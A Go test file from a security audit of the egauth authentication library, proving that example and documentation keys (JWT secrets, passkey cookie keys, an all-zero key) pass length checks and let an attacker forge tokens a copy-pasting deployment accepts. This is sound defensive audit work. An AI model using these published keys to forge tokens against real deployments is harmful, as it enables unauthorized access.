// PoC for SECRETS audit 2026-09-08: published example/docs keys are
// attacker-known AND accepted by the constructors (valid length), so any
// deployment that copy-pastes them ships a publicly-known signing/HMAC key.
package egauth_test

import (
	"bytes"
	"context"
	"os"
	"testing"
	"time"

	"github.com/JLugagne/egauth/passkey"
	passkeymem "github.com/JLugagne/egauth/passkey/memory"
	"github.com/JLugagne/egauth/tokens"
	"github.com/JLugagne/egauth/tokens/jwt"
	"github.com/JLugagne/egauth/tokens/memory"
	"github.com/google/uuid"
	"github.com/stretchr/testify/require"
)

// readPublished reads a published key string from the repo file at path,
// failing the test if the literal is ever rotated (PoC tracks the source).
func readPublished(t *testing.T, path, substr string) string {
	t.Helper()
	raw, err := os.ReadFile(path)
	require.NoError(t, err)
	require.Contains(t, string(raw), substr, "published key literal must still be present in %s", path)
	return substr
}

func jwtSvc(t *testing.T, secret string) *jwt.Service[struct{}] {
	t.Helper()
	return jwt.New[struct{}](jwt.Config[struct{}]{
		Store:      memory.NewStore[struct{}](),
		Issuer:     "egauth-secrets-poc",
		SecretKey:  secret,
		AccessTTL:  5 * time.Minute,
		RefreshTTL: time.Hour,
	})
}

// TestPOC_FullstackExampleSecretForgesTokens proves examples/fullstack/main.go's
// hardcoded SecretKey is accepted by jwt.New and lets an attacker holding only
// the published string mint tokens the victim deployment verifies.
func TestPOC_FullstackExampleSecretForgesTokens(t *testing.T) {
	secret := readPublished(t, "examples/fullstack/main.go",
		"replace-with-a-32-byte-minimum-secret-in-production!")
	require.GreaterOrEqual(t, len(secret), jwt.MinSecretKeyLength)

	ctx := context.Background()
	victim := jwtSvc(t, secret)   // deployment that copy-pasted the example
	attacker := jwtSvc(t, secret) // attacker knows only the published string

	forged, err := attacker.IssueTokenPair(ctx, tokens.Claims[struct{}]{
		Subject:  uuid.Must(uuid.NewV7()),
		TenantID: "tenant-victim",
	})
	require.NoError(t, err)

	got, err := victim.VerifyAccessTokenForTenant(ctx, "tenant-victim", forged.AccessToken)
	require.NoError(t, err, "attacker-minted token with published example secret must verify on victim")
	require.NotNil(t, got)
}

// TestPOC_DocsSecretForgesTokens proves docs/content/docs/sdk/tokens-and-http.md's
// published SecretKey is a valid-length, attacker-known HS256 key.
func TestPOC_DocsSecretForgesTokens(t *testing.T) {
	secret := readPublished(t, "docs/content/docs/sdk/tokens-and-http.md",
		"super-secret-32-byte-key-here!!!")
	require.GreaterOrEqual(t, len(secret), jwt.MinSecretKeyLength)

	ctx := context.Background()
	victim := jwtSvc(t, secret)
	attacker := jwtSvc(t, secret)

	forged, err := attacker.IssueTokenPair(ctx, tokens.Claims[struct{}]{
		Subject: uuid.Must(uuid.NewV7()),
	})
	require.NoError(t, err)

	_, err = victim.VerifyAccessTokenForTenant(ctx, "", forged.AccessToken)
	require.NoError(t, err, "attacker-minted token with published docs secret must verify on victim")
}

// TestPOC_DocsCookieKeyAccepted proves docs/content/docs/sdk/mfa.md's published
// passkey cookieKey passes the MinCookieKeyLength gate, i.e. a copy-paste
// deployment HMACs ceremony cookies with an attacker-known key.
func TestPOC_DocsCookieKeyAccepted(t *testing.T) {
	key := []byte(readPublished(t, "docs/content/docs/sdk/mfa.md",
		"very-secure-32-byte-secret-key!!"))
	require.GreaterOrEqual(t, len(key), passkey.MinCookieKeyLength)

	_, err := passkey.NewService(passkeymem.NewStore(), passkey.Config{
		RPID:           "poc.example",
		RPDisplayName:  "poc",
		RPOrigins:      []string{"https://poc.example"},
		CookieKey:      key,
		ChallengeStore: passkeymem.NewChallengeStore(),
	})
	require.NoError(t, err, "published docs cookieKey must be accepted by NewService")
}

// TestPOC_FullstackZeroCookieKeyAccepted proves examples/fullstack/main.go's
// `make([]byte, 32)` zero key passes the length gate: the ceremony-cookie HMAC
// key is 32 zero bytes — known to every reader of the repo.
func TestPOC_FullstackZeroCookieKeyAccepted(t *testing.T) {
	raw, err := os.ReadFile("examples/fullstack/main.go")
	require.NoError(t, err)
	require.Contains(t, string(raw), "cookieKey := make([]byte, 32)")

	zeroKey := make([]byte, 32) // exactly what the example builds
	require.True(t, bytes.Equal(zeroKey, bytes.Repeat([]byte{0}, 32)),
		"example key is all-zeros: attacker-known without reading any deployment")

	_, err = passkey.NewService(passkeymem.NewStore(), passkey.Config{
		RPID:           "poc.example",
		RPDisplayName:  "poc",
		RPOrigins:      []string{"https://poc.example"},
		CookieKey:      zeroKey,
		ChallengeStore: passkeymem.NewChallengeStore(),
	})
	require.NoError(t, err, "all-zero example cookieKey must be accepted by NewService")
}
